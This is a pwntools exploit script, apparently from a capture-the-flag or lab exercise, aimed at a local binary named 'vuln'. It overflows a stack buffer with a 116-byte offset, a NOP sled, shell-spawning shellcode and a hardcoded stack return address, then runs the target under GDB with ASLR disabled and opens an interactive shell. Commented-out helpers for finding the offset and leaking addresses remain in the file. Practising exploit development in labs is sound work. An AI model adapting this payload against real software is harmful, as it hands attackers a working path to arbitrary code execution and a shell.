from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    # p = process(exe, level='warn')
    # p.sendlineafter(b'>', payload)
    p = process([exe, payload], level='warn')
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
set disassemble-next-line on
break func
c
n
n 
n
while 1
    si
end
'''.format(**locals())
# print $ebp
# print $ebp - 0x6c
# print $ebp - 0x6c + 0x14
# x/50wx $esp
# Binary filename
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
# offset = find_ip(cyclic(120))
offset = 116
# Start program
io = start() # Just a placeholder argument
#
# # Build the payload
# payload = flat({
#     offset: [
#
#     ]
# })
#
# # Send the payload
# io.sendlineafter(b'>', payload)
# io.recvuntil(b'Thank you!')
#
# # Got Shell?
# io.interactive()

# Get the stack address (where our shellcode will go)
# io.recvlines(6)
# stack_addr = int(re.search(r" (0x[\w\d]+)", io.recvlines()).group(0), 16)
# info("leaked stack_addr: %#x", stack_addr)

# Build a pattern that won't crash but will cause the binary to leak addresses
# pattern = b"A" * offset  # Use a non-crashing length
#
#
# def get_stack_addr():
#     p = gdb.debug([exe, pattern], gdbscript=gdbscript)
#     output = p.recvall()
#
#     # Looking for "$ebp - 0x78" output format
#     buffer_match = re.search(rb"\$\d+\s*=\s*(0x[0-9a-f]+)", output)
#     if buffer_match:
#         buffer_addr = int(buffer_match.group(1), 16)
#         info("Found buffer address: %#x", buffer_addr)
#         return buffer_addr
#
# print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
# print(get_stack_addr())
# print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")

# Need to pop registers at the beginning to make room on stack
# shellcode = asm(shellcraft.popad())
#Build shellcode (cat flag.txt or spawn shell)
shellcode = asm(shellcraft.sh())
#Pad shellcode with NOPS until we get to return address
#Build the payload
stack_addr = p32(0xffffcf90)
# 0xffffcfa0
# stack_addr = b'\x20\xcf\xff\xff'
print(stack_addr)
padding=asm('nop') * (offset - len(shellcode) - len(stack_addr))
payload = flat([
padding,
shellcode,
stack_addr
    ])
print("payload length:", len(payload))
# io.sendlineafter (b'>', payload) # Inject payload
# Close the previous process
# io.close()

# Start a new process with the actual payload as command line argument
io = gdb.debug(['./vuln', payload], aslr=False, gdbscript=gdbscript)
#Got Shell?
io.interactive()